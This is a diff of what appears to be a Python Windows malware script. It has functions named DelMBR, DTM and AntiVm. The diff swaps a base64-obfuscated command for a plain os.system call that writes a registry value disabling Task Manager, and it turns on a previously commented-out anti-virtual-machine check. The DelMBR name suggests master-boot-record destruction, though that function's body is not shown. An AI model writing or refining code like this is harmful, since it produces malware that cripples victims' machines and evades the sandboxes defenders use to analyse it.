@@ -9,7 +9,6 @@ from pathlib import Path
 from tkinter import messagebox
 import psutil
 import time
-import base64
 from win32gui import *
 from win32ui import *
 from win32con import *
@@ -105,14 +104,9 @@ def DelMBR():
 
 def DTM():
     try:
-        base64_message  = "InN0YXJ0IGNtZCAvYyBSRUcgYWRkIEhLQ1VcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVtIC92IERpc2FibGVUYXNrTWdyIC90IFJFR19EV09SRCAvZCAxIC9mIg=="
-        base64_bytes = base64_message.encode('UTF-8')
-        message_bytes = base64.b64decode(base64_bytes)
-        code = message_bytes.decode('UTF-8')
-
-        os.system(code)
+        os.system("start cmd /c REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")
     except:
         pass
 
-#AntiVm()
+AntiVm()
 Warning()
